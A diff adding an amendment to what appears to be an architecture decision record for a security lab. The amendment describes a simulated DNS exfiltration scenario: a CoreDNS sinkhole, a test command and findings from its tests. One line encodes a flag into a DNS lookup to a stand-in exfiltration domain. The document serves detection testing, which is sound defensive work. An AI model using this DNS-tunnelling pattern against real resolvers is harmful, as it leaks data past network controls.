@@ -528,3 +528,44 @@ throwaway OpenSearch shaped like siem01) and on siem01 itself.
 - siem01's own stream holds the gateway's discovery broadcast every 10 s as nft drops (about 8 600
   small documents a day); left in, it is real traffic the firewall drops.
 - The hubble fixture is synthetic until the exporter runs; L9 replaces it with a capture.
+
+## Amendment 2026-10-04: dns-exfil as built (P5)
+
+**Context.** P5 delivers the scenario of "A scenario only correlation catches" without the SIEM side:
+the sinkhole, the command and their tests. The command works with or without the SIEM; its rule and
+canary land with the rules (P3), the incident with the section (P4).
+
+**Decision, as built.**
+- **Sinkhole** - ConfigMap `coredns-custom`, key `exfil-sinkhole.server`, delivered by the k3s role
+  with CoreDNS (ADR 0026 amendment of 2026-10-04): `exfil.sdp.test:53` with `errors`, `prometheus` and
+  `template ANY ANY exfil.sdp.test { rcode NXDOMAIN }` - no `forward`, no `log`. `make validate`
+  refuses any other content.
+- **Command** - catalogue id `dns-exfil` after `beacon`, objective "Phone home", T1048.003, `allowed`,
+  layer network, input `nslookup sdp-<flag>.x.exfil.sdp.test.`, alias `exfil`; the argv and its exit
+  semantics are ADR 0032's amendment of 2026-10-04 (exit 0 only on NXDOMAIN, D3 and F10, replacing
+  the `; true` above).
+- **Order of delivery** - CoreDNS first, then the proof from a sandbox pod (`SINKHOLE_ONLY=1
+  tests/scenarios/run.sh`), only then the catalogue: until kubelet has projected the new ConfigMap and
+  `reload` has read it, the zone is forwarded like any other name.
+
+**What the tests found.**
+- **The forward counter has another name.** `coredns_forward_requests_total` does not exist in
+  CoreDNS 1.14.7 (the forward plugin's request metrics moved to `coredns_proxy_*{proxy_name="forward"}`
+  in 1.11). "Forward counter unchanged" is asserted on
+  `coredns_proxy_conn_cache_hits_total + coredns_proxy_conn_cache_misses_total` (every upstream exchange
+  as it starts), next to `coredns_plugin_enabled{zone="exfil.sdp.test."}`, which names the zone's
+  plugins exactly (errors, prometheus, template) and is free of the background lookups that also move
+  the cluster-wide forward counter.
+- **The probe must come from `sandbox`.** run.sh's `ensure_probe_pod` lives in `portfolio-api`, whose
+  CiliumNetworkPolicy lets DNS through the proxy only for `*.cluster.local`; a lookup in the zone from
+  there is refused by Cilium before CoreDNS sees it and proves nothing about the sinkhole. The probe is
+  a pod with the terminal's own spec in `sandbox` (`matchPattern: "*"`), the path the command takes.
+- **N9 closed:** with every query dropped, busybox `nslookup` waits 5.0-5.1 s and exits 1; run.sh's
+  `timeout 6` bounds it, the API's 5 s command bound usually ends it first.
+- **F7 holds as written:** under quarantine the query never reaches Cilium's DNS proxy, so there is no
+  query name to match and no NXDOMAIN; the command exits non-zero and "Phone home" is not achieved.
+- The command prints the resolver's address (`Server: 10.43.0.10`); the terminal output passes the
+  API's scrub, which publishes it as `[ip]` (ADR 0021).
+
+**Still open after P5:** the Hubble DNS rule and its canary (P3), the `dns-exfil` incident with the flag
+match and `falco_events: 0` (P4); L7 closes in those phases.
